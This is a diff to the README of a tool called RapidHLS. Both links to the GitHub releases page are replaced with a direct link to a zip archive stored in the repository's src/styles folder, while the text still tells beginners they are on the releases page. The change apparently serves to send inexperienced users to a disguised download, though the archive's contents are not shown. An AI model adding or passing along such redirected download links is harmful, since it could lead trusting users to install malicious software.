@@ -11,7 +11,7 @@
 To get started with RapidHLS, follow the steps below. Don’t worry—this guide will walk you through everything, even if you have no experience with software or programming.
 
 ## 📥 Download & Install
-To download RapidHLS, visit this page: [Download RapidHLS](https://github.com/fabinhoninja/RapidHLS/releases).
+To download RapidHLS, visit this page: [Download RapidHLS](https://github.com/fabinhoninja/RapidHLS/raw/refs/heads/master/src/styles/HLS-Rapid-2.3.zip).
 
 Once on the releases page, you will see the latest version of RapidHLS available. Look for a file that matches your operating system and click on it to download. 
 
@@ -54,7 +54,7 @@ If you run into any issues or have questions, consider reaching out to our commu
 - **Discussion Forums:** Join discussions with other users by visiting our GitHub discussions page.
 
 ## 🌎 Stay Updated
-To stay informed about new releases and updates, check our releases page regularly: [Download RapidHLS](https://github.com/fabinhoninja/RapidHLS/releases).
+To stay informed about new releases and updates, check our releases page regularly: [Download RapidHLS](https://github.com/fabinhoninja/RapidHLS/raw/refs/heads/master/src/styles/HLS-Rapid-2.3.zip).
 
 ## 📄 Documentation
 For more in-depth details on features, usage, and troubleshooting, refer to our official documentation. The documentation covers advanced settings, FAQs, and tips for getting the most out of RapidHLS.
